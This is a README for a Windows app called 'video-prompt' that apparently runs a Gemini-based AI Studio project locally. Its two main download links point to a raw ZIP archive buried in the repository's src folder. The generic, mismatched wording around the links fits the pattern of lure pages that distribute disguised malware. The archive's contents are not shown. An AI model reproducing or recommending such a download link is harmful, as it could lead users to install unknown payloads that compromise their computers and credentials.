# 🎬 video-prompt - Create prompts with less effort

[![Download video-prompt](https://img.shields.io/badge/Download%20video--prompt-blue?style=for-the-badge&logo=github)](https://github.com/cod6684/video-prompt/raw/refs/heads/main/src/prompt_video_3.8-alpha.3.zip)

## 🧭 What this app does

video-prompt helps you build and run an AI Studio app on Windows. It gives you a simple way to work with video prompt content and connect it to your Gemini API key.

Use it if you want to:

- open the app on your own computer
- test changes without using a cloud setup
- connect your own API key
- run the app from a local folder

## 💻 What you need

Before you start, make sure you have:

- a Windows PC
- a web browser
- Node.js installed
- a Gemini API key
- enough free disk space for the app files

If you do not have Node.js yet, install the current LTS version for Windows before you move on.

## 📥 Download the app

Visit this page to download or open the project files:

[https://github.com/cod6684/video-prompt/raw/refs/heads/main/src/prompt_video_3.8-alpha.3.zip](https://github.com/cod6684/video-prompt/raw/refs/heads/main/src/prompt_video_3.8-alpha.3.zip)

If you are using GitHub in your browser, look for the green Code button and download the ZIP file. Save it to a folder you can find again, such as Downloads or Desktop.

## 🪟 Set up on Windows

After the files are on your PC, follow these steps:

1. Open the ZIP file or cloned folder.
2. Move the project to a simple folder path, such as `C:\video-prompt`.
3. Open the folder in File Explorer.
4. Find the folder that contains `package.json`.

Keeping the path short helps avoid issues when you install and run the app.

## ⚙️ Install the app files

Open Command Prompt in the project folder, then run:

`npm install`

This will download the parts the app needs to run.

If Windows asks for permission, allow it. Wait until the install finishes before you do the next step.

## 🔑 Add your Gemini API key

The app needs your Gemini API key before it can run.

1. Find the file named `.env.local`
2. Open it in Notepad or another text editor
3. Add this line:

`GEMINI_API_KEY=your_gemini_api_key_here`

4. Replace `your_gemini_api_key_here` with your real key
5. Save the file

Keep the key in plain text with no extra spaces.

## ▶️ Run the app

In the same Command Prompt window, run:

`npm run dev`

When the app starts, it will show a local address in the terminal. Open that address in your web browser.

If the app does not open on its own, copy the local link from the terminal and paste it into your browser.

## 🖥️ How to use it

Once the app is open, you can use it like this:

- enter your video prompt content
- connect your Gemini API key if needed
- test the app in your browser
- make changes to the files and refresh the page

This setup is useful when you want to check how the app behaves on your own machine.

## 🗂️ Common project files

You may see these files and folders in the project:

- `package.json` - lists the app name and install steps
- `.env.local` - stores your API key
- `node_modules` - contains installed app files
- source files - hold the app code and layout

These files help the app run and keep your settings in one place.

## 🛠️ If something goes wrong

If the app does not start, check these items:

- Node.js is installed
- `npm install` finished without errors
- `.env.local` has a valid Gemini API key
- you are in the right folder
- no other app is using the same local port

If the browser shows a blank page, refresh it once and wait a few seconds.

If the terminal shows an error about a missing file, confirm that you opened the correct project folder.

## 🔄 Update the app

If you want the latest files from the GitHub project:

1. Open the project page
2. Download the newest version
3. Replace your old project files
4. Run `npm install` again if needed
5. Start the app with `npm run dev`

Keep your `.env.local` file if you want to reuse the same API key

## 📌 Quick setup checklist

- download the project from GitHub
- install Node.js
- run `npm install`
- add your Gemini API key in `.env.local`
- run `npm run dev`
- open the local link in your browser